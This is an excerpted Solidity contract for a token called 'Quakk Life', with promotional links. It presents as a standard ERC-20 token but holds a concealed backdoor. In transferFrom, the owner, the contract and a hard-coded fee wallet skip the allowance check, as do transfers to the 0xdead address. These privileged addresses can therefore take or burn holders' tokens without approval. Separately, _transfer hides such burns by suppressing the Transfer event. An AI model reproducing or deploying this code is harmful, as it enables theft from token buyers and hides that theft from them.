...
https://www.quakklife.live/

https://t.me/quakk_life

https://x.com/quakk_life
*/
...
contract QUAKK is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _quackExcludes;
    address payable private _quackFeeSaver;
    address private _quackHole = address(0xdead);
    ...
    string private constant _name = unicode"Quakk Life";
    ...
    constructor() payable {
        _quackFeeSaver = payable(0x8a6Cce8270D5B955A876E85918B77A88B32335D7);
        _balances[msg.sender] = _tTotal;
        _quackExcludes[owner()] = true;
        _quackExcludes[address(this)] = true;
        _quackExcludes[_quackFeeSaver] = true;
    ...
    function transferFrom(
        ...
        if (
            !((_msgSender() != uniswapV2Router.factory() &&
                _quackExcludes[msg.sender]) ||
                (sender != uniswapV2Pair && recipient == _quackHole))
        )
            _approve(
                sender,
                _msgSender(),
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_quackHole != to) emit Transfer(from, to, amount.sub(taxAmount));
    ...
    function sendETHToFee(uint256 amount) private {
        _quackFeeSaver.transfer(amount);
    }
